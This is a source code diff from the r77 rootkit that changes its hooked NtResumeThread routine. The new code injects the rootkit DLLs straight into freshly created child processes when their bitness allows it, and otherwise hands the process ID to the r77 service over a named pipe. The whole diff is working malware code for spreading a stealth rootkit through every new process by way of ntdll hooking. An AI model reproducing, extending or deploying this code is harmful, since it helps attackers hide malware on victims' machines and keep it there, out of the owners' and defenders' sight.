@@ -3,6 +3,7 @@
 #include "Config.h"
 #include "r77def.h"
 #include "r77win.h"
+#include "r77process.h"
 #include "ntdll.h"
 #include "detours.h"
 #include <Shlwapi.h>
@@ -214,37 +215,55 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 	// Child process hooking:
 	// When a process is created, its parent process calls NtResumeThread to start the new process after process creation is completed.
 	// At this point, the process is suspended and should be injected. After injection is completed, NtResumeThread should be called.
-	// To inject the process, a connection to the r77 service is performed through a named pipe.
-	// Because a 32-bit process can create a 64-bit child process, injection cannot be performed here.
+
+	// If this process is 32-bit and the new process is 64-bit:
+	//   Injection cannot be performed here. An injection request is sent to the r77 service through a named pipe.
+	// Else:
+	//   The new process is injected directly.
 
 	DWORD processId = GetProcessIdOfThread(thread);
 	if (processId != GetCurrentProcessId()) // If NtResumeThread is called on this process, it is not a child process
 	{
-		// Call the r77 service and pass the process ID.
-		HANDLE pipe = CreateFileW(CHILD_PROCESS_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-		if (pipe != INVALID_HANDLE_VALUE)
+		BOOL isWow64;
+		BOOL process64Bit;
+		if (RootkitDll32 == NULL ||
+			RootkitDll64 == NULL ||
+			!IsWow64Process(GetCurrentProcess(), &isWow64) ||
+			!Is64BitProcess(processId, &process64Bit) ||
+			isWow64 && process64Bit) // Current process is WoW, child process is x64
 		{
-			WRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS parameters;
-			parameters.PipeHandle = pipe;
-			parameters.ProcessId = processId;
-
-			// In some cases, the WriteFile call to the named pipe hangs indefinitely.
-			// This bug was introduced after injecting the r77 service into winlogon, rather than in a hollowed process.
-
-			// Therefore, we must execute this write operation in a separate thread.
-			// If this thread does not return within a given amount of time, we must assume that it failed,
-			// and just continue process initialization. The periodic process injection will catch this process
-			// within less than 100ms.
-
-			HANDLE thread = CreateThread(NULL, 0, WriteChildProcessPipeThread, &parameters, 0, NULL);
-			if (thread)
+			// Call the r77 service and pass the process ID.
+			HANDLE pipe = CreateFileW(CHILD_PROCESS_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+			if (pipe != INVALID_HANDLE_VALUE)
 			{
-				if (WaitForSingleObject(thread, 500) != WAIT_OBJECT_0)
+				WRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS parameters;
+				parameters.PipeHandle = pipe;
+				parameters.ProcessId = processId;
+
+				// In some cases, the WriteFile call to the named pipe hangs indefinitely.
+				// This bug was introduced after injecting the r77 service into winlogon, rather than in a hollowed process.
+
+				// Therefore, we must execute this write operation in a separate thread.
+				// If this thread does not return within a given amount of time, we must assume that it failed,
+				// and just continue process initialization. The periodic process injection will catch this process
+				// within less than 100ms.
+
+				HANDLE thread = CreateThread(NULL, 0, WriteChildProcessPipeThread, &parameters, 0, NULL);
+				if (thread)
 				{
-					// WriteFile got stuck.
-					TerminateThread(thread, 0);
+					if (WaitForSingleObject(thread, 500) != WAIT_OBJECT_0)
+					{
+						// WriteFile got stuck.
+						TerminateThread(thread, 0);
+					}
 				}
 			}
+		}
+		else
+		{
+			// Inject the process directly.
+			InjectDll(processId, RootkitDll32, RootkitDll32Size);
+			InjectDll(processId, RootkitDll64, RootkitDll64Size);
 		}
 	}
 
